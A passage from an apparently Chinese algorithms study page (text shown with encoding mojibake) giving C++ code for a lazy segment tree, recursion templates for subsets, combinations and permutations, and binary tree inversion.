class="hljs-title">SegmentTree</span> &#123;</span><br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; tr, lz;<br>    <br>    SegmentTree(<span class="hljs-type">int</span> _n) : n(_n), tr(<span class="hljs-number">4</span> * n), lz(<span class="hljs-number">4</span> * n) &#123;&#125; <span class="hljs-comment">// åˆå§‹åŒ–çº¿æ®µæ ‘</span><br>    <br>    <span class="hljs-type">void</span> <span class="hljs-title function_">apply</span><span class="hljs-params">(<span class="hljs-type">int</span> u, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> val)</span> &#123; <span class="hljs-comment">// è¿›è¡ŒåŒºé—´æ›´æ–°</span><br>        tr[u] += val * (r - l + <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (l != r) lz[u] += val;<br>    &#125;<br>    <br>    <span class="hljs-type">void</span> <span class="hljs-title function_">push</span><span class="hljs-params">(<span class="hljs-type">int</span> u, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> m, <span class="hljs-type">int</span> r)</span> &#123; <span class="hljs-comment">// è¿›è¡Œæ‡’æ ‡è®°ä¸‹ä¼ </span><br>        <span class="hljs-keyword">if</span> (lz[u]) &#123;<br>            apply(<span class="hljs-number">2</span> * u, l, m, lz[u]);<br>            apply(<span class="hljs-number">2</span> * u + <span class="hljs-number">1</span>, m + <span class="hljs-number">1</span>, r, lz[u]);<br>            lz[u] = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-type">void</span> <span class="hljs-title function_">build</span><span class="hljs-params">(<span class="hljs-type">int</span> u, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; a)</span> &#123; <span class="hljs-comment">// å»ºæ ‘</span><br>        <span class="hljs-keyword">if</span> (l == r) tr[u] = a[l];<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">int</span> m = (l + r) / <span class="hljs-number">2</span>;<br>            build(<span class="hljs-number">2</span> * u, l, m, a);<br>            build(<span class="hljs-number">2</span> * u + <span class="hljs-number">1</span>, m + <span class="hljs-number">1</span>, r, a);<br>            tr[u] = tr[<span class="hljs-number">2</span> * u] + tr[<span class="hljs-number">2</span> * u + <span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-type">void</span> <span class="hljs-title function_">upd</span><span class="hljs-params">(<span class="hljs-type">int</span> ul, <span class="hljs-type">int</span> ur, <span class="hljs-type">int</span> val)</span> &#123; upd(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, n - <span class="hljs-number">1</span>, ul, ur, val); &#125; <span class="hljs-comment">// æ›´æ–°åŒºé—´ [ul, ur]</span><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">upd</span><span class="hljs-params">(<span class="hljs-type">int</span> u, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> ul, <span class="hljs-type">int</span> ur, <span class="hljs-type">int</span> val)</span> &#123;<br>        <span class="hljs-keyword">if</span> (ul &lt;= l &amp;&amp; r &lt;= ur) apply(u, l, r, val);<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">int</span> m = (l + r) / <span class="hljs-number">2</span>;<br>            push(u, l, m, r);<br>            <span class="hljs-keyword">if</span> (ul &lt;= m) upd(<span class="hljs-number">2</span> * u, l, m, ul, ur, val);<br>            <span class="hljs-keyword">if</span> (ur &gt; m) upd(<span class="hljs-number">2</span> * u + <span class="hljs-number">1</span>, m + <span class="hljs-number">1</span>, r, ul, ur, val);<br>            tr[u] = tr[<span class="hljs-number">2</span> * u] + tr[<span class="hljs-number">2</span> * u + <span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-type">int</span> <span class="hljs-title function_">qry</span><span class="hljs-params">(<span class="hljs-type">int</span> ql, <span class="hljs-type">int</span> qr)</span> &#123; <span class="hljs-keyword">return</span> qry(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, n - <span class="hljs-number">1</span>, ql, qr); &#125; <span class="hljs-comment">// æŸ¥è¯¢åŒºé—´ [ql, qr] çš„å’Œ</span><br>    <span class="hljs-type">int</span> <span class="hljs-title function_">qry</span><span class="hljs-params">(<span class="hljs-type">int</span> u, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> ql, <span class="hljs-type">int</span> qr)</span> &#123;<br>        <span class="hljs-keyword">if</span> (ql &lt;= l &amp;&amp; r &lt;= qr) <span class="hljs-keyword">return</span> tr[u];<br>        <span class="hljs-type">int</span> m = (l + r) / <span class="hljs-number">2</span>;<br>        push(u, l, m, r);<br>        <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ql &lt;= m) res += qry(<span class="hljs-number">2</span> * u, l, m, ql, qr);<br>        <span class="hljs-keyword">if</span> (qr &gt; m) res += qry(<span class="hljs-number">2</span> * u + <span class="hljs-number">1</span>, m + <span class="hljs-number">1</span>, r, ql, qr);<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n, q;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; n &gt;&gt; q;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">a</span><span class="hljs-params">(n)</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) <span class="hljs-built_in">cin</span> &gt;&gt; a[i];<br>    SegmentTree <span class="hljs-title function_">st</span><span class="hljs-params">(n)</span>;<br>    st.build(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, n - <span class="hljs-number">1</span>, a);<br>    <br>    <span class="hljs-keyword">while</span> (q--) &#123;<br>        <span class="hljs-type">int</span> op;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; op;<br>        <span class="hljs-keyword">if</span> (op == <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// æ“ä½œ 1: åŒºé—´æ›´æ–°</span><br>            <span class="hljs-type">int</span> l, r, d;<br>            <span class="hljs-built_in">cin</span> &gt;&gt; l &gt;&gt; r &gt;&gt; d;<br>            st.upd(l, r, d);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == <span class="hljs-number">2</span>) &#123; <span class="hljs-comment">// æ“ä½œ 2: æŸ¥è¯¢åŒºé—´å’Œ</span><br>            <span class="hljs-type">int</span> l, r;<br>            <span class="hljs-built_in">cin</span> &gt;&gt; l &gt;&gt; r;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; st.qry(l, r) &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><h2 id="åå››-é€’å½’"><a href="#åå››-é€’å½’" class="headerlink" title="åå››.é€’å½’"></a>åå››.é€’å½’</h2><p>æ±‰ç½—å¡”é—®é¢˜</p><p>åªè¦å°†ä¸»è¿‡ç¨‹æƒ³å¥½ï¼Œä¹Ÿå°±æ˜¯</p><p>ä¸€.12ä»å·¦åˆ°ä¸­   äºŒ.3ä»å·¦åˆ°å³   ä¸‰.12ä»ä¸­åˆ°å³    å¦‚æœæ˜¯nä¸ªæ•°å‘¢ï¼Œå°±ç®€åŒ–ä¸º1â€”â€”n-1ä»å·¦åˆ°ä¸­ï¼Œnä»å·¦åˆ°å³ï¼Œ1â€”â€”n-1ä»ä¸­åˆ°å³å°±å¦‚æ­¤ç®€åŒ–ä¸‹å»</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">fï¼ˆxï¼‰&#123;<br>    <span class="hljs-type">int</span> x;      <span class="hljs-comment">//è¿™é‡Œæ˜¯å±€éƒ¨å˜é‡ï¼Œè¿˜ä¼šå†å¼€ä¸€æ¬¡int xã€‚æ‰€ä»¥å°±æ˜¯ç”±æ¯ä¸ªfå„è‡ªéƒ½æœ‰ä¸€f(n-1) ä»½å„¿  ï¼Œæ‰€ä»¥è¿™äº›å°±æ˜¯å¦‚æœè¯´éå±€éƒ¨çš„å˜é‡ã€‚  ä½ ä¸èƒ½è¯´æŸä¸€æ¬¡fæŠŠå®ƒæ”¹äº†ä¹‹åç®—åˆ«çš„fçš„æ—¶å€™è¯¶, å®ƒä»¬éœ€è¦æ³¨æ„ä¿æŠ¤è·Ÿè¿˜åŸè¿™                                                      </span><br>&#125;                                                                                            <br></code></pre></td></tr></table></figure><p>åŸºæœ¬æ¡†æ¶ï¼š</p><ul><li>è®¾è®¡ä¸€ä¸ªé»‘ç›’,å³è¿™ä¸ªå‡½æ•°è§£å†³çš„é—®é¢˜,è¿™äº›ä»£ç åœ¨å½“å‰è¿›ç¨‹çš„æ“ä½œ,è°ƒç”¨å‡½æ•°ç›¸å½“äºå¼€äº†ä¸€ä¸ªæ–°è¿›ç¨‹ï¼ˆæ ‘ï¼‰,æ•°å­¦ä¸Šå°±åƒæ•°åˆ—fï¼ˆxï¼‰ï¼Œæ¯ä¸€ä¸ªå°å—å³fxéƒ½è¦åšä»€ä¹ˆ</li><li>å®šä¹‰é€’å½’çš„è¾¹ç•Œ</li><li>ä¿æŠ¤è¿˜åŸç°åœº</li></ul><h3 id="ä¸‰ä¸ªæ¨¡ç‰ˆ"><a href="#ä¸‰ä¸ªæ¨¡ç‰ˆ" class="headerlink" title="ä¸‰ä¸ªæ¨¡ç‰ˆ"></a>ä¸‰ä¸ªæ¨¡ç‰ˆ</h3><h4 id="å­é›†é—®é¢˜"><a href="#å­é›†é—®é¢˜" class="headerlink" title="å­é›†é—®é¢˜"></a>å­é›†é—®é¢˜</h4><p>ç»™å®šä¸€ä¸ªæ•°ç»„ <code>nums</code>ï¼Œè¦æ±‚ç”Ÿæˆæ‰€æœ‰çš„å­é›†ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> n;<br>vector&lt;<span class="hljs-type">int</span>&gt; chosen;<br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; ans;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">recur</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> i)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (i == n) &#123; <span class="hljs-comment">// é€’å½’ç»ˆæ­¢æ¡ä»¶</span><br>        ans.<span class="hljs-built_in">push_back</span>(chosen);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// é€’å½’ä¸é€‰å½“å‰å…ƒç´ </span><br>    <span class="hljs-built_in">recur</span>(nums, i + <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// é€’å½’é€‰æ‹©å½“å‰å…ƒç´ </span><br>    chosen.<span class="hljs-built_in">push_back</span>(nums[i]);<br>    <span class="hljs-built_in">recur</span>(nums, i + <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// æ’¤é”€é€‰æ‹©ï¼Œè¿˜åŸç°åœºï¼Œè¿™é‡Œçš„chosenå±äºéå±€éƒ¨å˜é‡</span><br>    chosen.<span class="hljs-built_in">pop_back</span>();<br>&#125;<br><br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">subsets</span>(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums) &#123;<br>    n = nums.<span class="hljs-built_in">size</span>();<br>    <span class="hljs-built_in">recur</span>(nums, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> m;<br>    cin &gt;&gt; m;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">nums</span><span class="hljs-params">(m)</span></span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) cin &gt;&gt; nums[i];<br>    <br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; result = <span class="hljs-built_in">subsets</span>(nums);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; subset : result) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : subset) cout &lt;&lt; num &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>        cout &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><hr><h4 id="ç»„åˆé—®é¢˜ï¼š"><a href="#ç»„åˆé—®é¢˜ï¼š" class="headerlink" title="ç»„åˆé—®é¢˜ï¼š"></a>ç»„åˆé—®é¢˜ï¼š</h4><p>ç»™å®šæ•´æ•° <code>n</code> å’Œ <code>k</code>ï¼Œä» <code>[1, 2, ..., n]</code> ä¸­é€‰æ‹© <code>k</code> ä¸ªæ•°çš„æ‰€æœ‰ç»„åˆã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> n, k;<br>vector&lt;<span class="hljs-type">int</span>&gt; chosen;<br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; ans;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">recur</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> </span>&#123;<br>    <span class="hljs-comment">// å‰ªææ¡ä»¶</span><br>    <span class="hljs-keyword">if</span> (chosen.<span class="hljs-built_in">size</span>() + (n - i + <span class="hljs-number">1</span>) &lt; k) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-comment">// é€’å½’ç»ˆæ­¢æ¡ä»¶</span><br>    <span class="hljs-keyword">if</span> (i == n + <span class="hljs-number">1</span>) &#123;<br>        ans.<span class="hljs-built_in">push_back</span>(chosen);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// ä¸é€‰å½“å‰å…ƒç´ </span><br>    <span class="hljs-built_in">recur</span>(i + <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// é€‰æ‹©å½“å‰å…ƒç´ </span><br>    chosen.<span class="hljs-built_in">push_back</span>(i);<br>    <span class="hljs-built_in">recur</span>(i + <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// æ’¤é”€é€‰æ‹©</span><br>    chosen.<span class="hljs-built_in">pop_back</span>();<br>&#125;<br><br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">combine</span>(<span class="hljs-type">int</span> _n, <span class="hljs-type">int</span> _k) &#123;<br>    n = _n;<br>    k = _k;<br>    ans.<span class="hljs-built_in">clear</span>();<br>    chosen.<span class="hljs-built_in">clear</span>();<br>    <span class="hljs-built_in">recur</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> n, k;<br>    cin &gt;&gt; n &gt;&gt; k;<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; result = <span class="hljs-built_in">combine</span>(n, k);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; combination : result) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : combination) cout &lt;&lt; num &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>        cout &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h4 id="å…¨æ’åˆ—é—®é¢˜ï¼š"><a href="#å…¨æ’åˆ—é—®é¢˜ï¼š" class="headerlink" title="å…¨æ’åˆ—é—®é¢˜ï¼š"></a><strong>å…¨æ’åˆ—é—®é¢˜</strong>ï¼š</h4><p>ç»™å®šä¸€ä¸ªä¸åŒ…å«é‡å¤æ•°å­—çš„æ•°ç»„ <code>nums</code>ï¼Œè¦æ±‚ç”Ÿæˆæ‰€æœ‰å¯èƒ½çš„å…¨æ’åˆ—ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> n;<br>vector&lt;<span class="hljs-type">bool</span>&gt; used;<br>vector&lt;<span class="hljs-type">int</span>&gt; a;<br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; ans;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">recur</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> pos)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (pos == n) &#123;<br>        ans.<span class="hljs-built_in">push_back</span>(a);  <span class="hljs-comment">// æ‰¾åˆ°ä¸€ä¸ªæ’åˆ—</span><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-keyword">if</span> (!used[i]) &#123; <span class="hljs-comment">// è¿‡æ»¤å·²ä½¿ç”¨çš„å…ƒç´ </span><br>            a.<span class="hljs-built_in">push_back</span>(nums[i]);<br>            used[i] = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// æ ‡è®°ä¸ºä½¿ç”¨</span><br>            <span class="hljs-built_in">recur</span>(nums, pos + <span class="hljs-number">1</span>);  <span class="hljs-comment">// é€’å½’ä¸‹ä¸€å±‚</span><br>            used[i] = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// è¿˜åŸçŠ¶æ€</span><br>            a.<span class="hljs-built_in">pop_back</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">permute</span>(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums) &#123;<br>    n = nums.<span class="hljs-built_in">size</span>();<br>    used = <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">bool</span>&gt;(n, <span class="hljs-literal">false</span>);<br>    a.<span class="hljs-built_in">clear</span>();<br>    ans.<span class="hljs-built_in">clear</span>();<br>    <span class="hljs-built_in">recur</span>(nums, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin &gt;&gt; n;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">nums</span><span class="hljs-params">(n)</span></span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) cin &gt;&gt; nums[i];<br>    <br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; result = <span class="hljs-built_in">permute</span>(nums);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; permutation : result) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : permutation) cout &lt;&lt; num &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>        cout &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ä»¥ä¸Šä¸‰ä¸ªé—®é¢˜éƒ½æ˜¯é€’å½’å®ç°çš„â€œæš´åŠ›æœç´¢â€(æˆ–è€…å«æšä¸¾ã€å›æº¯ç­‰)å¯ä»¥æ€»ç»“ä¸ºä»¥ä¸‹ä¸‰ç§åŸºæœ¬å½¢å¼<br>é€’å½’å½¢å¼<br>æŒ‡æ•°å‹æ’åˆ—å‹ç»„åˆå‹<br>æ—¶é—´å¤æ‚åº¦è§„æ¨¡:knn!n!&#x2F;m!(n-m)!<br>å­é›†ã€å¤§ä½“ç§¯èƒŒåŒ…å…¨æ’åˆ—ã€æ—…è¡Œå•†ã€N çš‡åæ‰¾é¡ºåºçš„é¢˜ç›®ç»„åˆé€‰æ•°</p><h3 id="ä¾‹é¢˜-5"><a href="#ä¾‹é¢˜-5" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><h4 id="åè½¬äºŒå‰æ ‘ï¼š"><a href="#åè½¬äºŒå‰æ ‘ï¼š" class="headerlink" title="åè½¬äºŒå‰æ ‘ï¼š"></a><strong>åè½¬äºŒå‰æ ‘</strong>ï¼š</h4><p>è¯¥é—®é¢˜è¦æ±‚å¯¹ä¸€ä¸ªäºŒå‰æ ‘è¿›è¡Œå·¦å³å­æ ‘çš„äº¤æ¢ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">TreeNode* <span class="hljs-title">invertTree</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;  <span class="hljs-comment">// ç©ºèŠ‚ç‚¹è¿”å›</span><br>    TreeNode* temp = root-&gt;left;  <span class="hljs-comment">// äº¤æ¢å·¦å³å­æ ‘</span><br>    root-&gt;left = root-&gt;right;<br>    root-&gt;right = temp;<br>    <span class="hljs-built_in">invertTree</span>(root-&gt;left);  <span class="hljs-comment">// é€’å½’åè½¬å·¦å­æ ‘</span><br>    <span class="hljs-built_in">invertTree</span>(root-&gt;right);  <span class="hljs-comment">// é€’å½’åè½¬å³å­æ ‘</span><br>    <span class="hljs-keyword">return</span> root;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ç¿»è½¬ä¸€æ£µäºŒå‰æ ‘"><a href="#ç¿»è½¬ä¸€æ£µäºŒå‰æ ‘" class="headerlink" title="ç¿»è½¬ä¸€æ£µäºŒå‰æ ‘"></a>ç¿»è½¬ä¸€æ£µäºŒå‰æ ‘</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-comment">// å®šä¹‰äºŒå‰æ ‘èŠ‚ç‚¹ç»“æ„ä½“</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">TreeNode</span> &#123;<br>    <span class="hljs-type">int</span> val;<br>    TreeNode* left;<br>    TreeNode* right;<br><br>    <span class="hljs-comment">// æ„é€ å‡½æ•°ï¼šåˆå§‹åŒ–èŠ‚ç‚¹</span><br>    <span class="hljs-built_in">TreeNode</span>(<span class="hljs-type">int</span> x) : <span class="hljs-built_in">val</span>(x), <span class="hljs-built_in">left</span>(<span class="hljs-literal">NULL</span>), <span class="hljs-built_in">right</span>(<span class="hljs-literal">NULL</span>) &#123;&#125;<br>&#125;;<br><br><span class="hljs-comment">// ç¿»è½¬äºŒå‰æ ‘çš„é€’å½’å‡½æ•°</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">invertTree</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;  <span class="hljs-comment">// åŸºç¡€æ¡ä»¶ï¼šèŠ‚ç‚¹ä¸ºç©ºæ—¶ç›´æ¥è¿”å›</span><br><br>        <span class="hljs-comment">// äº¤æ¢å·¦å³å­æ ‘</span><br>        TreeNode* temp = root-&gt;left;<br>        root-&gt;left = root-&gt;right;<br>        root-&gt;right = temp;<br><br>        <span 